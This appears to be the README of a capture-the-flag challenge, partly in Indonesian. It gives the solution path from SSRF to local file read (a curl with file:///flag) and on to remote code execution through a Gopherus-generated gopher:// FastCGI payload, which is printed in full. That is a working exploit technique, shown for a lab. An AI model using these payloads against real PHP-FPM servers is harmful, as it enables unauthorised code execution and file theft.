# php-mpf (php-fpm)
TODO: buat flag

## deploy
1. ubah port eksternal di `docker-compose.yml`
2. `docker-compose build`
3. `docker-compose up`

## flag 1
SSRF to LFI

```
curl http://url:port/ -X POST -d 'url=file:///flag'
```

## flag 2
SSRF to RCE, config discovery pakai default path, baca file lewat LFI dari solusi sebelumnya, contoh:
```
/etc/nginx/conf.d/default.conf
/etc/apache2/...
```

dari itu didapet url/socket fastcgi, pakai [Gopherus](https://github.com/tarunkant/Gopherus/) untuk dapat payload RCE.

```
$ python2 gopherus.py --exploit fastcgi
...
Give one file name which should be surely present in the server (prefer .php file)
if you don't know press ENTER we have default one:  /var/www/html/index.php
Terminal command to run:  ls -la /

Your gopher link is ready to do SSRF:

gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%04%04%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%02CONTENT_LENGTH60%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%17SCRIPT_FILENAME/var/www/html/index.php%0D%01DOCUMENT_ROOT/%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00%3C%04%00%3C%3Fphp%20system%28%27ls%20-la%20/%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00
...
$ curl http://url:port/ -X POST -d "url=gopher://127.0.0.1:9000_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%04%04%00%0F%10SERVER_SOFTWAREgo%20%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/.1%0E%02CONTENT_LENGTH60%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%17SCRIPT_FILENAME/var/www/html/index.php%0D%01DOCUMENT_ROOT%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00%3C%04%00%3C%3Fphp%20system%28%27ls%20-la%20%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00"
```
